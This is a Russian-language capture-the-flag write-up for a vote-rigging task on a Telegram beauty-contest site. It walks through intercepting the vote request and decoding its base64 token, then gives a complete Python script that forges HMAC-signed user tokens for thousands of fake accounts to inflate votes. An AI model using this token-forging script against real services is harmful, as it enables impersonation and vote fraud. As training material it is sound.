# Мисс Фрод

Жюри конкурса онлайн-красоты подозревает, что некоторые участники накручивают себе голоса. Проанализируйте сайт с голосованием и разберитесь, как участники крутанули рейтинг. В качестве доказательства накрутите своему конкурсанту хотя бы тысячу голосов.

Да, за успешное расследование вам тоже дадут корону.

[**@ctf_beauty_contest_bot**](https://t.me/ctf_beauty_contest_bot)

Решение:

Заходим в burp и голосуем за нашего кандидата. 

![Untitled](Untitled%2023.png)

Ловим такой запрос. Нас интересует параметр Authorization. Заходим в decode и прогоняем его через base64. 

![Untitled](Untitled%2024.png)

Видим, что наш токен собирается из данных пользователя и какого-то хэша. Нужно узнать что за хэш. 

![Untitled](Untitled%2025.png)

В javascript узнаем как он формируется. Осталось написать скрипт, который будет авторизовывать разных пользователей

```jsx
import requests
import base64
import hashlib
import hmac
import json
import urllib.parse
from pathlib import Path
from dataclasses import dataclass, asdict

URL = "https://t-pageant-ekbooq0e.spbctf.net/api/vote"
param = {"contestant_id":2889}

for i in range (10000):
    check_keys = 'user={"id": ' + str(457635778 + i) + ', "first_name": "tef", "last_name": "", "username": "tef", "language_code": "en", "allows_write_to_pm": true}'
    secretKey = bytes.fromhex("0b4162a45f8c74b4005a25d4c20b0158198c83b38462bd02e42cd18f9842dc83")
    dig = hmac.new(secretKey, check_keys.encode(), digestmod=hashlib.sha256)
    stringt = urllib.parse.quote(check_keys).replace('%3D', '=') + '&hash=' + dig.hexdigest()
    tokenmy = base64.b64encode(('"' + stringt + '"').encode()).decode()
    h = {"Content-Type": "application/json",
         "Authorization": f"Bearer {tokenmy}",
         }
    rep = requests.post(URL, headers=h, json=param)
    print(rep.json())
```

Ждем 1000 голосов и забираем флаг

![Untitled](Untitled%2026.png)

![Untitled](Untitled%2027.png)